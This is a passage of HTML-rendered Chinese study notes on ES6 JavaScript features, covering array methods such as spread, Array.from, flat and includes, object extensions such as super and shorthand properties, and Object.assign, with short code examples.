ES6的写法</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">x, y, z</span>) </span>&#123;&#125;</span><br><span class="line"><span class="keyword">let</span> args = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line">f(...args);</span><br></pre></td></tr></table></figure><h3 id="扩展运算符的应用"><a href="#扩展运算符的应用" class="headerlink" title="扩展运算符的应用"></a>扩展运算符的应用</h3><p><strong>（1）复制数组</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> a1 = [<span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// ES5 的复制数组</span></span><br><span class="line"><span class="keyword">const</span> a2 = a1.concat();</span><br><span class="line"></span><br><span class="line"><span class="comment">// ES6 的复制数组</span></span><br><span class="line"><span class="comment">// 写法一</span></span><br><span class="line"><span class="keyword">const</span> a2 = [...a1];</span><br><span class="line"><span class="comment">// 写法二</span></span><br><span class="line"><span class="keyword">const</span> [...a2] = a1;</span><br></pre></td></tr></table></figure><p><strong>（2）合并数组</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> arr1 = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">const</span> arr2 = [<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">const</span> arr3 = [<span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// ES5 的合并数组</span></span><br><span class="line">arr1.concat(arr2, arr3);</span><br><span class="line"><span class="comment">// [ &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27; ]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ES6 的合并数组</span></span><br><span class="line">[...arr1, ...arr2, ...arr3]</span><br><span class="line"><span class="comment">// [ &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27; ]</span></span><br></pre></td></tr></table></figure><p>不过，这两种方法都是浅拷贝。新数组的成员都是对原数组成员的引用，如果修改了引用指向的值，会同步反映到新数组。</p><p><strong>（3）与解构赋值结合</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> [first, ...rest] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line">first <span class="comment">// 1</span></span><br><span class="line">rest  <span class="comment">// [2, 3, 4, 5]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> [first, ...rest] = [];</span><br><span class="line">first <span class="comment">// undefined</span></span><br><span class="line">rest  <span class="comment">// []</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> [first, ...rest] = [<span class="string">&quot;foo&quot;</span>];</span><br><span class="line">first  <span class="comment">// &quot;foo&quot;</span></span><br><span class="line">rest   <span class="comment">// []</span></span><br></pre></td></tr></table></figure><p>如果将扩展运算符用于数组赋值，只能放在参数的最后一位，否则会报错。</p><p><strong>（4）字符串</strong></p><p>扩展运算符还可以将字符串转为真正的数组。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">[...<span class="string">&#x27;hello&#x27;</span>]</span><br><span class="line"><span class="comment">// [ &quot;h&quot;, &quot;e&quot;, &quot;l&quot;, &quot;l&quot;, &quot;o&quot; ]</span></span><br></pre></td></tr></table></figure><p><strong>（5）实现了 Iterator 接口的对象</strong></p><p>任何定义了遍历器（Iterator）接口的对象，都可以用扩展运算符转为真正的数组。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> nodeList = <span class="built_in">document</span>.querySelectorAll(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> array = [...nodeList];</span><br></pre></td></tr></table></figure><p>上面代码中，<code>querySelectorAll</code>方法返回的是一个<code>NodeList</code>对象，是类数组。这时，扩展运算符可以将其转为真正的数组，原因就在于<code>NodeList</code>对象实现了 Iterator 。</p><h2 id="2、Array-from"><a href="#2、Array-from" class="headerlink" title="2、Array.from()"></a>2、Array.from()</h2><p><code>Array.from</code>方法用于将两类对象转为真正的数组：类似数组的对象和可遍历的对象（包括 ES6 新增的数据结构 Set 和 Map）。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arrayLike = &#123;</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>: <span class="string">&#x27;a&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>: <span class="string">&#x27;b&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;2&#x27;</span>: <span class="string">&#x27;c&#x27;</span>,</span><br><span class="line">    <span class="attr">length</span>: <span class="number">3</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ES5的写法</span></span><br><span class="line"><span class="keyword">var</span> arr1 = [].slice.call(arrayLike); <span class="comment">// [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ES6的写法</span></span><br><span class="line"><span class="keyword">let</span> arr2 = <span class="built_in">Array</span>.from(arrayLike); <span class="comment">// [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]</span></span><br></pre></td></tr></table></figure><p>实际应用中，常见的类似数组的对象是 DOM 操作返回的 NodeList 集合，以及函数内部的<code>arguments</code>对象。<code>Array.from</code>都可以将它们转为真正的数组。</p><p>所谓类似数组的对象，本质特征只有一点，即必须有<code>length</code>属性。因此，任何有<code>length</code>属性的对象，都可以通过<code>Array.from</code>方法转为数组，而此时扩展运算符就无法转换。</p><p><code>Array.from</code>还可以接受第二个参数，作用类似于数组的<code>map</code>方法，用来对每个元素进行处理，将处理后的值放入返回的数组。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Array</span>.from(arrayLike, <span class="function"><span class="params">x</span> =&gt;</span> x * x);</span><br></pre></td></tr></table></figure><p>下面的例子是取出一组 DOM 节点的文本内容。（感觉挺重要）</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> spans = <span class="built_in">document</span>.querySelectorAll(<span class="string">&#x27;span.name&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// map()</span></span><br><span class="line"><span class="keyword">let</span> names1 = <span class="built_in">Array</span>.prototype.map.call(spans, <span class="function"><span class="params">s</span> =&gt;</span> s.textContent);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Array.from()</span></span><br><span class="line"><span class="keyword">let</span> names2 = <span class="built_in">Array</span>.from(spans, <span class="function"><span class="params">s</span> =&gt;</span> s.textContent)</span><br></pre></td></tr></table></figure><p>下面的例子将数组中布尔值为<code>false</code>的成员转为<code>0</code>。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Array</span>.from([<span class="number">1</span>, , <span class="number">2</span>, , <span class="number">3</span>], <span class="function">(<span class="params">n</span>) =&gt;</span> n || <span class="number">0</span>)</span><br><span class="line"><span class="comment">// [1, 0, 2, 0, 3]</span></span><br></pre></td></tr></table></figure><p>如果<code>map</code>函数里面用到了<code>this</code>关键字，还可以传入<code>Array.from</code>的第三个参数，用来绑定<code>this</code>。</p><h2 id="3、Array-of"><a href="#3、Array-of" class="headerlink" title="3、Array.of()"></a>3、Array.of()</h2><p><code>Array.of()</code>方法用于将一组值，转换为数组。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Array</span>.of(<span class="number">3</span>, <span class="number">11</span>, <span class="number">8</span>) <span class="comment">// [3,11,8]</span></span><br><span class="line"><span class="built_in">Array</span>.of(<span class="number">3</span>) <span class="comment">// [3]</span></span><br><span class="line"><span class="built_in">Array</span>.of(<span class="number">3</span>).length <span class="comment">// 1</span></span><br></pre></td></tr></table></figure><p>这个方法的主要目的，是弥补数组构造函数<code>Array()</code>的不足。因为参数个数的不同，会导致<code>Array()</code>的行为有差异。只有当参数个数不少于 2 个时，<code>Array()</code>才会返回由参数组成的新数组。参数只有一个正整数时，实际上是指定数组的长度。</p><p><code>Array.of()</code>方法可以用下面的代码模拟实现。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ArrayOf</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> [].slice.call(<span class="built_in">arguments</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4、数组实例的-copyWithin"><a href="#4、数组实例的-copyWithin" class="headerlink" title="4、数组实例的 copyWithin()"></a>4、数组实例的 copyWithin()</h2><p>在当前数组内部，将指定位置的成员复制到其他位置（会覆盖原有成员），然后返回当前数组</p><h2 id="5、数组实例的-find-和-findIndex"><a href="#5、数组实例的-find-和-findIndex" class="headerlink" title="5、数组实例的 find() 和 findIndex()"></a>5、数组实例的 find() 和 findIndex()</h2><p>数组实例的<code>find</code>方法，用于找出第一个符合条件的数组成员。它的参数是一个回调函数，所有数组成员依次执行该回调函数，直到找出第一个返回值为<code>true</code>的成员，然后返回该成员；如果没有符合条件的成员，则返回<code>undefined</code>。<code>find</code>方法的回调函数可以接受三个参数，依次为当前的值、当前的位置和原数组。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">4</span>, -<span class="number">5</span>, <span class="number">10</span>].find(<span class="function">(<span class="params">n</span>) =&gt;</span> n &lt; <span class="number">0</span>)</span><br><span class="line"><span class="comment">// -5</span></span><br></pre></td></tr></table></figure><p>数组实例的<code>findIndex</code>方法的用法与<code>find</code>方法非常类似，返回第一个符合条件的数组成员的位置，如果所有成员都不符合条件，则返回<code>-1</code>。</p><p>这两个方法都可以接受第二个参数，用来绑定回调函数的<code>this</code>对象。另外，这两个方法都可以发现<code>NaN</code>，弥补了数组的<code>indexOf</code>方法的不足。</p><h2 id="6、数组实例的-fill"><a href="#6、数组实例的-fill" class="headerlink" title="6、数组实例的 fill()"></a>6、数组实例的 fill()</h2><p><code>fill</code>方法使用给定值，填充一个数组。<code>fill</code>方法用于空数组的初始化非常方便。数组中已有的元素，会被全部抹去。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>].fill(<span class="number">7</span>)</span><br><span class="line"><span class="comment">// [7, 7, 7]</span></span><br></pre></td></tr></table></figure><p><code>fill</code>方法还可以接受第二个和第三个参数，用于指定填充的起始位置和结束位置。（不包括结束位置）</p><p>注意，如果填充的类型为对象，那么被赋值的是同一个内存地址的对象，而不是深拷贝对象。</p><h2 id="7、数组实例的-entries-，keys-和-values"><a href="#7、数组实例的-entries-，keys-和-values" class="headerlink" title="7、数组实例的 entries()，keys() 和 values()"></a>7、数组实例的 entries()，keys() 和 values()</h2><p>它们都返回一个遍历器对象，可以用<code>for...of</code>循环进行遍历，唯一的区别是<code>keys()</code>是对键名的遍历、<code>values()</code>是对键值的遍历，<code>entries()</code>是对键值对的遍历。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> [index, elem] <span class="keyword">of</span> [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>].entries()) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(index, elem);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 0 &quot;a&quot;</span></span><br><span class="line"><span class="comment">// 1 &quot;b&quot;</span></span><br></pre></td></tr></table></figure><p>如果不使用<code>for...of</code>循环，可以手动调用遍历器对象的<code>next</code>方法，进行遍历。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> letter = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">let</span> entries = letter.entries();</span><br><span class="line"><span class="built_in">console</span>.log(entries.next().value); <span class="comment">// [0, &#x27;a&#x27;]</span></span><br></pre></td></tr></table></figure><h2 id="8、数组实例的-includes"><a href="#8、数组实例的-includes" class="headerlink" title="8、数组实例的 includes()"></a>8、数组实例的 includes()</h2><p><code>Array.prototype.includes</code>方法返回一个布尔值，表示某个数组是否包含给定的值，与字符串的<code>includes</code>方法类似。该方法的第二个参数表示搜索的起始位置，默认为<code>0</code>。如果第二个参数为负数，则表示倒数的位置，如果这时它大于数组长度（比如第二个参数为<code>-4</code>，但数组长度为<code>3</code>），则会重置为从<code>0</code>开始。</p><p>没有该方法之前，我们通常使用数组的<code>indexOf</code>方法，检查是否包含某个值。<code>indexOf</code>方法有两个缺点：</p><ul><li><p>不够语义化，它的含义是找到参数值的第一个出现位置，所以要去比较是否不等于<code>-1</code>，表达起来不够直观。</p></li><li><p>内部使用严格相等运算符（<code>===</code>）进行判断，这会导致对<code>NaN</code>的误判。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">[<span class="literal">NaN</span>].indexOf(<span class="literal">NaN</span>)</span><br><span class="line"><span class="comment">// -1</span></span><br></pre></td></tr></table></figure></li></ul><p>Map 和 Set 数据结构有一个<code>has</code>方法，需要注意与<code>includes</code>区分。</p><ul><li>Map 结构的<code>has</code>方法，是用来查找键名的，比如<code>Map.prototype.has(key)</code>、<code>WeakMap.prototype.has(key)</code>、<code>Reflect.has(target, propertyKey)</code>。</li><li>Set 结构的<code>has</code>方法，是用来查找值的，比如<code>Set.prototype.has(value)</code>、<code>WeakSet.prototype.has(value)</code>。</li></ul><h2 id="9、数组实例的-flat-，flatMap"><a href="#9、数组实例的-flat-，flatMap" class="headerlink" title="9、数组实例的 flat()，flatMap()"></a>9、数组实例的 flat()，flatMap()</h2><p><code>Array.prototype.flat()</code>用于将嵌套的数组“拉平”，变成一维的数组。该方法返回一个新数组，对原数据没有影响。<code>flat()</code>默认只会“拉平”一层，如果想要“拉平”多层的嵌套数组，可以将<code>flat()</code>方法的参数写成一个整数，表示想要拉平的层数。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">2</span>, [<span class="number">3</span>, [<span class="number">4</span>, <span class="number">5</span>]]].flat()</span><br><span class="line"><span class="comment">// [1, 2, 3, [4, 5]]</span></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, [<span class="number">3</span>, [<span class="number">4</span>, <span class="number">5</span>]]].flat(<span class="number">2</span>)</span><br><span class="line"><span class="comment">// [1, 2, 3, 4, 5]</span></span><br></pre></td></tr></table></figure><p>如果不管有多少层嵌套，都要转成一维数组，可以用<code>Infinity</code>关键字作为参数。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">[<span class="number">1</span>, [<span class="number">2</span>, [<span class="number">3</span>]]].flat(<span class="literal">Infinity</span>)</span><br><span class="line"><span class="comment">// [1, 2, 3]</span></span><br></pre></td></tr></table></figure><p>如果原数组有空位，<code>flat()</code>方法会跳过空位。</p><p><code>flatMap()</code>方法对原数组的每个成员执行一个函数（相当于执行<code>Array.prototype.map()</code>），然后对返回值组成的数组执行<code>flat()</code>方法。该方法返回一个新数组，不改变原数组。<code>flatMap()</code>只能展开一层数组。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 相当于 [[2, 4], [3, 6], [4, 8]].flat()</span></span><br><span class="line">[<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>].flatMap(<span class="function"><span class="params">x</span> =&gt;</span> [x, x * <span class="number">2</span>])</span><br><span class="line"><span class="comment">// [2, 4, 3, 6, 4, 8]</span></span><br></pre></td></tr></table></figure><h2 id="10、数组的空位"><a href="#10、数组的空位" class="headerlink" title="10、数组的空位"></a>10、数组的空位</h2><p>数组的空位指，数组的某一个位置没有任何值。注意，空位不是<code>undefined</code>，一个位置的值等于<code>undefined</code>，依然是有值的。空位是没有任何值。</p><p>ES6 明确将空位转为<code>undefined</code>。<code>Array.from</code>方法会将数组的空位，转为<code>undefined</code>。扩展运算符（<code>...</code>）也会将空位转为<code>undefined</code>。</p><h2 id="11、Array-prototype-sort-的排序稳定性"><a href="#11、Array-prototype-sort-的排序稳定性" class="headerlink" title="11、Array.prototype.sort() 的排序稳定性"></a>11、Array.prototype.sort() 的排序稳定性</h2><p>常见的排序算法之中，插入排序、合并排序、冒泡排序等都是稳定的，堆排序、快速排序等是不稳定的。不稳定排序的主要缺点是，多重排序时可能会产生问题。假设有一个姓和名的列表，要求按照“姓氏为主要关键字，名字为次要关键字”进行排序。开发者可能会先按名字排序，再按姓氏进行排序。如果排序算法是稳定的，这样就可以达到“先姓氏，后名字”的排序效果。如果是不稳定的，就不行。</p><p><a href="https://github.com/tc39/ecma262/pull/1340">ES2019</a> 明确规定，<code>Array.prototype.sort()</code>的默认排序算法必须稳定。</p><h1 id="对象的扩展"><a href="#对象的扩展" class="headerlink" title="对象的扩展"></a>对象的扩展</h1><h2 id="1、属性的简洁表示法"><a href="#1、属性的简洁表示法" class="headerlink" title="1、属性的简洁表示法"></a>1、属性的简洁表示法</h2><p>ES6 允许在大括号里面，直接写入变量和函数，作为对象的属性和方法。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">x, y</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;x, y&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">x, y</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;<span class="attr">x</span>: x, <span class="attr">y</span>: y&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f(<span class="number">1</span>, <span class="number">2</span>) <span class="comment">// Object &#123;x: 1, y: 2&#125;</span></span><br></pre></td></tr></table></figure><p>除了属性简写，方法也可以简写。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> o = &#123;</span><br><span class="line">  <span class="function"><span class="title">method</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Hello!&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> o = &#123;</span><br><span class="line">  <span class="attr">method</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Hello!&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="2、属性名表达式"><a href="#2、属性名表达式" class="headerlink" title="2、属性名表达式"></a>2、属性名表达式</h2><p>JavaScript 定义对象的属性，有两种方法。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 方法一</span></span><br><span class="line">obj.foo = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法二</span></span><br><span class="line">obj[<span class="string">&#x27;a&#x27;</span> + <span class="string">&#x27;bc&#x27;</span>] = <span class="number">123</span>;</span><br></pre></td></tr></table></figure><h2 id="3、方法的-name-属性"><a href="#3、方法的-name-属性" class="headerlink" title="3、方法的 name 属性"></a>3、方法的 name 属性</h2><p>对象方法也是函数，因此也有<code>name</code>属性。方法的<code>name</code>属性返回方法名。</p><p>如果对象的方法使用了取值函数（<code>getter</code>）和存值函数（<code>setter</code>），则<code>name</code>属性不是在该方法上面，而是该方法的属性的描述对象的<code>get</code>和<code>set</code>属性上面，返回值是方法名前加上<code>get</code>和<code>set</code>。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">  <span class="keyword">get</span> <span class="title">foo</span>() &#123;&#125;,</span><br><span class="line">  <span class="keyword">set</span> <span class="title">foo</span>(<span class="params">x</span>) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">obj.foo.name</span><br><span class="line"><span class="comment">// TypeError: Cannot read property &#x27;name&#x27; of undefined</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> descriptor = <span class="built_in">Object</span>.getOwnPropertyDescriptor(obj, <span class="string">&#x27;foo&#x27;</span>);</span><br><span class="line"></span><br><span class="line">descriptor.get.name <span class="comment">// &quot;get foo&quot;</span></span><br><span class="line">descriptor.set.name <span class="comment">// &quot;set foo&quot;</span></span><br></pre></td></tr></table></figure><h2 id="4、属性的可枚举性和遍历"><a href="#4、属性的可枚举性和遍历" class="headerlink" title="4、属性的可枚举性和遍历"></a>4、属性的可枚举性和遍历</h2><h3 id="可枚举性"><a href="#可枚举性" class="headerlink" title="可枚举性"></a>可枚举性</h3><p>对象的每个属性都有一个描述对象（Descriptor），用来控制该属性的行为。<code>Object.getOwnPropertyDescriptor</code>方法可以获取该属性的描述对象。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123; <span class="attr">foo</span>: <span class="number">123</span> &#125;;</span><br><span class="line"><span class="built_in">Object</span>.getOwnPropertyDescriptor(obj, <span class="string">&#x27;foo&#x27;</span>)</span><br><span class="line"><span class="comment">//  &#123;</span></span><br><span class="line"><span class="comment">//    value: 123,</span></span><br><span class="line"><span class="comment">//    writable: true,</span></span><br><span class="line"><span class="comment">//    enumerable: true,</span></span><br><span class="line"><span class="comment">//    configurable: true</span></span><br><span class="line"><span class="comment">//  &#125;</span></span><br></pre></td></tr></table></figure><h3 id="属性的遍历"><a href="#属性的遍历" class="headerlink" title="属性的遍历"></a>属性的遍历</h3><p>ES6 一共有 5 种方法可以遍历对象的属性。</p><p><strong>（1）for…in</strong></p><p><code>for...in</code>循环遍历对象自身的和继承的可枚举属性（不含 Symbol 属性）。</p><p><strong>（2）Object.keys(obj)</strong></p><p><code>Object.keys</code>返回一个数组，包括对象自身的（不含继承的）所有可枚举属性（不含 Symbol 属性）的键名。</p><p><strong>（3）Object.getOwnPropertyNames(obj)</strong></p><p><code>Object.getOwnPropertyNames</code>返回一个数组，包含对象自身的所有属性（不含 Symbol 属性，但是包括不可枚举属性）的键名。</p><p><strong>（4）Object.getOwnPropertySymbols(obj)</strong></p><p><code>Object.getOwnPropertySymbols</code>返回一个数组，包含对象自身的所有 Symbol 属性的键名。</p><p><strong>（5）Reflect.ownKeys(obj)</strong></p><p><code>Reflect.ownKeys</code>返回一个数组，包含对象自身的（不含继承的）所有键名，不管键名是 Symbol 或字符串，也不管是否可枚举。</p><p>以上的 5 种方法遍历对象的键名，都遵守同样的属性遍历的次序规则。</p><ul><li>首先遍历所有数值键，按照数值升序排列。</li><li>其次遍历所有字符串键，按照加入时间升序排列。</li><li>最后遍历所有 Symbol 键，按照加入时间升序排列。</li></ul><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Reflect</span>.ownKeys(&#123; [<span class="built_in">Symbol</span>()]:<span class="number">0</span>, <span class="attr">b</span>:<span class="number">0</span>, <span class="number">10</span>:<span class="number">0</span>, <span class="number">2</span>:<span class="number">0</span>, <span class="attr">a</span>:<span class="number">0</span> &#125;)</span><br><span class="line"><span class="comment">// [&#x27;2&#x27;, &#x27;10&#x27;, &#x27;b&#x27;, &#x27;a&#x27;, Symbol()]</span></span><br></pre></td></tr></table></figure><h2 id="5、super-关键字"><a href="#5、super-关键字" class="headerlink" title="5、super 关键字"></a>5、super 关键字</h2><p><code>this</code>关键字总是指向函数所在的当前对象，ES6 又新增了另一个类似的关键字<code>super</code>，指向当前对象的原型对象。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> proto = &#123;</span><br><span class="line">  <span class="attr">foo</span>: <span class="string">&#x27;hello&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">  <span class="attr">foo</span>: <span class="string">&#x27;world&#x27;</span>,</span><br><span class="line">  <span class="function"><span class="title">find</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">super</span>.foo;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.setPrototypeOf(obj, proto);</span><br><span class="line">obj.find() <span class="comment">// &quot;hello&quot;</span></span><br></pre></td></tr></table></figure><p>注意，<code>super</code>关键字表示原型对象时，只能用在对象的方法之中。</p><p>JavaScript 引擎内部，<code>super.foo</code>等同于<code>Object.getPrototypeOf(this).foo</code>（属性）或<code>Object.getPrototypeOf(this).foo.call(this)</code>（方法）。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> proto = &#123;</span><br><span class="line">  <span class="attr">x</span>: <span class="string">&#x27;hello&#x27;</span>,</span><br><span class="line">  <span class="function"><span class="title">foo</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">this</span>.x);</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">  <span class="attr">x</span>: <span class="string">&#x27;world&#x27;</span>,</span><br><span class="line">  <span class="function"><span class="title">foo</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.foo();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.setPrototypeOf(obj, proto);</span><br><span class="line"></span><br><span class="line">obj.foo() <span class="comment">// &quot;world&quot;</span></span><br></pre></td></tr></table></figure><p>上面代码中，<code>super.foo</code>指向原型对象<code>proto</code>的<code>foo</code>方法，但是绑定的<code>this</code>却还是当前对象<code>obj</code>，因此输出的就是<code>world</code>。</p><h2 id="6、对象的扩展运算符"><a href="#6、对象的扩展运算符" class="headerlink" title="6、对象的扩展运算符"></a>6、对象的扩展运算符</h2><p>扩展运算符（<code>...</code>），同《数组的扩展》</p><p>对象的扩展运算符等同于使用<code>Object.assign()</code>方法。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> aClone = &#123; ...a &#125;;</span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="keyword">let</span> aClone = <span class="built_in">Object</span>.assign(&#123;&#125;, a);</span><br></pre></td></tr></table></figure><h2 id="7、链判断运算符"><a href="#7、链判断运算符" class="headerlink" title="7、链判断运算符"></a>7、链判断运算符</h2><p> ES2020引入了“链判断运算符”<code>?.</code></p><h2 id="8、Null-判断运算符"><a href="#8、Null-判断运算符" class="headerlink" title="8、Null 判断运算符"></a>8、Null 判断运算符</h2><p>读取对象属性的时候，如果某个属性的值是<code>null</code>或<code>undefined</code>，有时候需要为它们指定默认值。常见做法是通过<code>||</code>运算符指定默认值。</p><p>但是这样写是错的。开发者的原意是，只要属性的值为<code>null</code>或<code>undefined</code>，默认值就会生效，但是属性的值如果为空字符串或<code>false</code>或<code>0</code>，默认值也会生效。</p><p>为了避免这种情况，<a href="https://github.com/tc39/proposal-nullish-coalescing">ES2020</a> 引入了一个新的 Null 判断运算符<code>??</code>。它的行为类似<code>||</code>，但是只有运算符左侧的值为<code>null</code>或<code>undefined</code>时，才会返回右侧的值。</p><h1 id="对象的新增方法"><a href="#对象的新增方法" class="headerlink" title="对象的新增方法"></a>对象的新增方法</h1><h2 id="1、Object-is"><a href="#1、Object-is" class="headerlink" title="1、Object.is()"></a>1、Object.is()</h2><p>ES5 比较两个值是否相等，只有两个运算符：相等运算符（<code>==</code>）和严格相等运算符（<code>===</code>）。它们都有缺点，前者会自动转换数据类型，后者的<code>NaN</code>不等于自身，以及<code>+0</code>等于<code>-0</code>。</p><p>Object.is用来比较两个值是否严格相等。</p><h2 id="2、Object-assign"><a href="#2、Object-assign" class="headerlink" title="2、Object.assign()"></a>2、Object.assign()</h2><p><code>Object.assign()</code>方法用于对象的合并，将源对象（source）的所有可枚举属性，复制到目标对象（target）。<code>Object.assign()</code>方法的第一个参数是目标对象，后面的参数都是源对象。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> target = &#123; <span class="attr">a</span>: <span class="number">1</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> source1 = &#123; <span class="attr">b</span>: <span class="number">2</span> &#125;;</span><br><span class="line"><span class="keyword">const</span> source2 = &#123; <span class="attr">c</span>: <span class="number">3</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.assign(target, source1, source2);</span><br><span class="line">target <span class="comment">// &#123;a:1, b:2, c:3&#125;</span></span><br></pre></td></tr></table></figure><p>注意，如果目标对象与源对象有同名属性，或多个源对象有同名属性，则后面的属性会覆盖前面的属性。</p><h3 id="注意点-1"><a href="#注意点-1" class="headerlink" title="注意点"></a>注意点</h3><p><strong>（1）浅拷贝</strong></p><p><code>Object.assign()</code>方法实行的是浅拷贝，而不是深拷贝。也就是说，如果源对象某个属性的值是对象，那么目标对象拷贝得到的是这个对象的引用。</p><p><strong>（2）同名属性的替换</strong></p><p>对于这种嵌套的对象，一旦遇到同名属性，<code>Object.assign()</code>的处理方法是替换，而不是添加。</p><figure class="highlight 